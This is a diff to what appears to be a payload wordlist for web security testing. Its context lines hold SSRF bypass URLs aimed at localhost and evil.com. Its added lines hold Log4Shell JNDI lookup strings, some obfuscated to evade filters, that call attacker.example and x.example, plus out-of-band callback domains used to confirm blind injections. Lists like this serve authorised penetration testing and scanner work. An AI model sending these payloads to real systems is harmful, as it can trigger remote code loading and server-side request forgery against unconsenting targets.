@@ -49,3 +49,12 @@ http://127.0.0.1%23@evil.com
 http://evil.com/?url=http://127.0.0.1
 http://0177.0.0.1
 http://0x7f.0x0.0x0.0x1
+
+# === Log4Shell lookups and out-of-band callback domains ===
+${jndi:ldap://attacker.example/a}
+${${lower:j}ndi:ldap://x.example/a}
+${${::-j}${::-n}${::-d}${::-i}:ldap://x.example/a}
+http://abc123.burpcollaborator.net/x
+https://x.oastify.com/6.17.0.RELEASE
+abc.oast.me
+h.interact.sh
